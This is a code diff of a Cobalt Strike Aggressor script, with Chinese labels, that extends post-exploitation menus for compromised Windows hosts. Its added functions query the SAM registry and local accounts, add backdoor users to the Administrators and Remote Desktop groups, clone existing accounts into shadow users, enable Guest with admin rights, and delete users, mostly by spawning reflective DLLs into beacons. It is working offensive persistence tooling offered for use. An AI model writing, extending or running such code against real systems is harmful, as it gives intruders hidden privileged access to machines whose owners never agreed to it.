@@ -273,22 +273,73 @@ menu "系统服务" {
 }
 
 menu "用户操作" {
-	item "查询用户" {
+	item "查询账户" {
 		local('$bid');
 		foreach $bid ($1){
-			bnet($bid, "user");
-			#blog($bid, "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names");
-			#bshell($bid, "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names");
+			$Dialog = dialog("查询账户",%(user => "Yanghao",localgroups => "Administrators",addtype => "NET", bid => $bid),lambda({
+				if($3['user'] eq ""){
+					if($3['addtype'] eq "NET" ){
+						blog($3['bid'],"net1 user");
+						bshell($3['bid'],"net1 user");	
+					}
+					if($3['addtype'] eq "BNET" ){
+						bnet($3['bid'], "user");
+					}
+					if($3['addtype'] eq "API" ){
+						local('$Parameter $bid');
+						$bid = $3['bid'];
+						$Parameter = "GetGroupUsers"."|1|1|".$3['localgroups']."|1";
+						blog($bid,"$Parameter");
+						bdllspawn!($bid, getFileProper("D:\\ActivePart\\Code\\VS2019\\DLL\\0x02_ReflectiveDLL\\CobaltStrike_script\\Persistence\\UserAPI\\Release\\reflective_dll.dll"),$Parameter, "GetGroupUsers", 5000);	
+					}
+					if($3['addtype'] eq "REG" ){
+						blog($3['bid'], "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names");
+						bshell($3['bid'], "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names");
+					}
+				}else{
+					if($3['addtype'] eq "NET" ){
+						blog($3['bid'],"net1 user $3['user'] ");
+						bshell($3['bid'],"net1 user $3['user'] ");	
+					}
+					if($3['addtype'] eq "BNET" ){
+						bnet($3['bid'], "user", "\\\\127.0.0.1" ,$3['user']);
+					}
+					if($3['addtype'] eq "API" ){
+						local('$Parameter $User $bid');
+						$bid = $3['bid'];
+						$User = $3['user'];
+
+						$Parameter = "QueryUserInfo"."|".$User."|1|1|1";
+						blog($bid,"$Parameter");
+						bdllspawn!($bid, getFileProper("D:\\ActivePart\\Code\\VS2019\\DLL\\0x02_ReflectiveDLL\\CobaltStrike_script\\Persistence\\UserAPI\\Release\\reflective_dll.dll"),$Parameter, "QueryUserInfo", 5000);	
+						
+					}
+					if($3['addtype'] eq "REG" ){
+						blog($3['bid'], "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\$3['user']");
+						bshell($3['bid'], "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\$3['user']");
+					}
+				}
+			
+				
+			}));
+			dialog_description($Dialog, "查询账户（使用API，账户参数为空时根据组查询全部用户；查询指定账户时，组名参数会被忽略）。其他用户提示:administrator,Guest;本地组查询：net localgroup");
+			drow_text($Dialog, "user", "账户名称: ");
+			drow_combobox($Dialog, "localgroups", "选择账户组: ", @("Users","Guests","Administrators","Remote Desktop Users","Remote Management Users","System Managed Accounts Group",)); 
+			drow_combobox($Dialog, "addtype", "查询方式: ", @("NET","BNET","API","REG"));
+			dbutton_action($Dialog, "查询");
+			dbutton_help($Dialog, "https://www.qq.com");
+			dialog_show($Dialog);
 		}
 	}
 	
 	item "添加用户" {
 		local('$bid');
 		foreach $bid ($1){
-			$Dialog = dialog("添加用户",%(user => "Yanghao",pass => "Yanghao@123$",localgroups => "Administrators",addtype => "NET",bid => $bid),&AdUser);
-			dialog_description($Dialog, "添加用户");
+			$Dialog = dialog("添加新用户到组",%(user => "xasda",pass => "Yanghao@123",localgroups => "Administrators",comment => "我爱雨夜花",addtype => "API",bid => $bid),&AdUser);
+			dialog_description($Dialog, "添加用户，密码中不要包含\$，否则容易出bug.");
 			drow_text($Dialog, "user", "账户名称: ");
 			drow_text($Dialog, "pass", "账户密码: ");
+			drow_text($Dialog, "comment", "账户描述: ");
 			drow_combobox($Dialog, "localgroups", "加入的组: ", @("Administrators","Remote Desktop Users","Users","Guests"));  # net localgroup
 			drow_combobox($Dialog, "addtype", "添加方式: ", @("NET","API"));
 			dbutton_action($Dialog, "AdUser");
@@ -300,11 +351,11 @@ menu "用户操作" {
 		local('$bid');
 		foreach $bid ($1){
 			$Dialog = dialog("CloneUser",%(user => "Yanghao",pass => "Yanghao@123$",cloneuser => "Administrator",bid => $bid),&CloneUser);
-			dialog_description($Dialog, "用户克隆");
+			dialog_description($Dialog, "用户克隆。(注意：该操作不会新增用户，但会更新用户密码)");
 			drow_text($Dialog, "user", "账户名称: ");
 			drow_text($Dialog, "pass", "账户密码: ");
 			drow_text($Dialog, "cloneuser", "被克隆用户: ");
-			dbutton_action($Dialog, "CloneUser");
+			dbutton_action($Dialog, "执行");
 			dialog_show($Dialog);
 		}
 	}
@@ -321,20 +372,30 @@ menu "用户操作" {
 		}
 	}
 	
-	item "用户激活与禁用" {
+	item "修改账户" {
 		local('$bid');
 		foreach $bid ($1){
-			$Dialog = dialog("禁用/激活用户",%(user => "Guest",pass => "Yanghao@123$",localgroups => "Administrators",addtype => "NET",DoFt => "enable",bid => $bid),&EnGuest);
-			dialog_description($Dialog, "禁用/激活用户：1(enable).激活用户后设置密码,加入组;2(disabled).移除用户组,禁用用户;3(移除组).从特定组中移除账户。注意:Win10激活Guest无法直接用于登录。");
+			$Dialog = dialog("修改账户",%(user => "Guest",pass => "Yanghao@123$",comment => "供来宾访问计算机或访问域的内置帐户",localgroups => "Administrators",addtype => "NET",DoFt => "enable",bid => $bid),&ChangeAccount);
+			dialog_description($Dialog, "1(enable).激活账户后设置密码并加入组（如果账户不存在会失败,存在的账户描述信息不会被修改）;2(disabled).移除用户组,禁用用户;3(移除组).从特定组中移除账户。注意:Win10激活Guest无法直接用于登录。");
 			drow_text($Dialog, "user", "账户名称: ");
 			drow_text($Dialog, "pass", "账户密码: ");
-			drow_combobox($Dialog, "localgroups", "操作的组: ", @("Administrators","Remote Desktop Users","Users"));  # net localgroup
+			drow_text($Dialog, "comment", "账户描述: ");
+			drow_combobox($Dialog, "localgroups", "操作的组: ", @("Administrators","Remote Desktop Users","Users","Guests"));  # net localgroup
 			drow_combobox($Dialog, "addtype", "执行方式: ", @("NET","API"));
 			drow_combobox($Dialog, "DoFt", "执行方法: ", @("enable","disabled","removeGroup"));
 			dbutton_action($Dialog, "执行");
 			dialog_show($Dialog);
 		}
 	}	
+}
+
+
+menu "RDP控制" {
+	item "查询RDP端口" {};
+	item "RDP设置" {};
+	item "RDP多用户设置" {};
+
+
 }
 
 menu "启动目录" {
@@ -1896,14 +1957,17 @@ sub QService{
 	}
 }
 
-sub EnGuest{
-	local('$User $Pwd $groups $bid $Type $Do');
+sub ChangeAccount{
+	local('$User $Pwd $groups $bid $Type $Do $Parameter $comment $tmp');
 	$bid = $3['bid'];
 	$User = $3['user'];
 	$Pwd = $3['pass'];
 	$groups = $3['localgroups'];
-	$Type = $3['addtype'];  #API NET 
-	$Do = $3['DoFt'];       #禁用 、启用、删除组用户
+	$tmp = replace($3['comment'],' ','');
+	$tmp = replace($tmp,'|','');
+	$comment = URLencode($tmp); #账户描述 
+	$Type = $3['addtype'];   #API NET 
+	$Do = $3['DoFt'];        #禁用 、启用、删除组用户
 	#启用
 	if($Do eq "enable"){
 		#net 命令启用
@@ -1914,10 +1978,12 @@ sub EnGuest{
 			bshell($bid, "net user $User $Pwd");
 		}else if($Type eq "API"){
 			# API 启用
-			blog($bid, "Use API to Enable user $User");
-			blog($bid, "Parameter is:$User $+ ,1 $+ ,$groups $+ ,$Pwd");
 			# Guest,1,administrators,password  启用Guest,加入管理组,设置密码
-			bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),"$User $+ ,1 $+ ,$groups $+ ,$Pwd", "EnGuest API", 5000);	
+			
+			blog($bid, "Use API to Enable account $User");
+			$Parameter = "EnableAccount" . "|" . $User . "|" . $Pwd  . "|" .$groups."|".$comment;
+			blog($bid, "$Parameter");
+			bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),$Parameter, "enable account", 5000);	
 		}else{
 			blog($bid, "0");
 		}
@@ -1929,9 +1995,12 @@ sub EnGuest{
 			bshell($bid, "net localgroup $groups $User /del");
 			bshell($bid, "net user $User /active:no");
 		}else if($Type eq "API"){
-			blog($bid, "Use API to Enable user Guest.");
-			# Guest,0,administrators,password  禁用Guest,移除管理组,设置密码(不会执行)
-			bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),"$User $+ ,0 $+ ,$groups $+ ,$Pwd", "EnGuest API", 5000);	
+			blog($bid, "Use API to disable account $User");
+			# Guest,0,administrators,password  禁用Guest,移除所属组,设置密码(不会执行)
+			
+			$Parameter = "DisableUser"."|".$User."|1|".$groups."|1";
+			blog($bid, "$Parameter");
+			bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),$Parameter, "disable account", 5000);	
 		}else{
 			
 		}
@@ -1943,19 +2012,23 @@ sub EnGuest{
 		}else if($Type eq "API"){
 			blog($bid, "Use API to Remove user $User in Groups $groups");
 			# Guest,3,administrators,password  移除用户所属组(因为如果guest在管理组里,下次激活会失败),设置密码(不会执行)
-			bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),"$User $+ ,3 $+ ,$groups $+ ,$Pwd", "EnGuest API", 5000);	
+		
+			$Parameter = "DelUserFromGroup"."|".$User."|".$Pwd."|".$groups."|1";
+			bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),$Parameter, "DelUserFromGroup", 5000);	
 		}else{
 			
 		}
 	}
 }
+
 sub AdUser{
-	local('$User $Pwd $groups $bid $Type');
+	local('$User $Pwd $groups $bid $Type $Parameter $comment $tmp');
 	$bid = $3['bid'];
 	$User = $3['user'];
 	$Pwd = $3['pass'];
 	$groups = $3['localgroups'];
 	$Type = $3['addtype'];
+	$comment = replace($3['comment'],' ','');
 	if($Type eq "NET"){
 		blog($bid, "net1 user $User $Pwd /add");
 		blog($bid, "net1 localgroup $groups $User /add");
@@ -1963,21 +2036,25 @@ sub AdUser{
 		bshell($bid, "net1 localgroup $groups $User /add");
 	}
 	else if($Type eq "API"){
-		blog($bid,"ShadowUser.exe $User $Cuser $Pwd");
-		bexecute_assembly($bid, script_resource("Persistence/Modules/AdUserApi/HaryyUser.exe"), "-u $User -p $Pwd -g $groups");
+		$Parameter = "AddUser" . "|" . $User . "|" . $Pwd  . "|" .$groups."|".URLencode($comment);
+		blog($bid,"$Parameter");
+		bdllspawn!($bid, getFileProper("D:\\ActivePart\\Code\\VS2019\\DLL\\0x02_ReflectiveDLL\\CobaltStrike_script\\Persistence\\UserAPI\\Release\\reflective_dll.dll"),$Parameter, "AdUser", 5000);	
+		
 	}else{
 
 	}
 }
 
+
 sub CloneUser{
-	local('$bid $User $Pwd $Cuser');
+	local('$bid $User $Pwd $Cuser $Parameter');
 	$bid = $3['bid'];
 	$User = $3['user'];
 	$Pwd = $3['pass'];
 	$Cuser = $3['cloneuser'];
-	blog($bid,"ShadowUser.exe $User $Cuser $Pwd");
-	bexecute_assembly($bid, script_resource("Persistence/Modules/ShadowUser/scvhost.exe"), "$User $Cuser $Pwd");
+	$Parameter = "CloneUser" . "|" . $User . "|" . $Pwd  . "|" .$Cuser."|1";
+	blog($bid,"$Parameter");
+	bdllspawn!($bid, getFileProper("D:\\ActivePart\\Code\\VS2019\\DLL\\0x02_ReflectiveDLL\\CobaltStrike_script\\Persistence\\UserAPI\\Release\\reflective_dll.dll"),$Parameter, "CloneUser", 5000);	
 }
 
 sub DeleteUser{
@@ -1989,9 +2066,11 @@ sub DeleteUser{
 		blog($bid, "net user $User /del");
 		bshell($bid, "net user $User /del");
 	}else if($Type eq "API"){
-		btask($bid, "Use API to Delete user $User");
-		# Guest,4,administrators,password  删除用户
-		bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),"$User $+ ,4 $+ ,0 $+ ,0", "EnGuest API", 5000);	
+		$Parameter = "DelUser"."|".$User."|1|1|1";
+		blog($bid,"$Parameter");
+		bdllspawn!($bid, getFileProper("D:\\ActivePart\\Code\\VS2019\\DLL\\0x02_ReflectiveDLL\\CobaltStrike_script\\Persistence\\UserAPI\\Release\\reflective_dll.dll"),$Parameter, "DelUser", 5000);	
+
+		
 	}	
 }
 
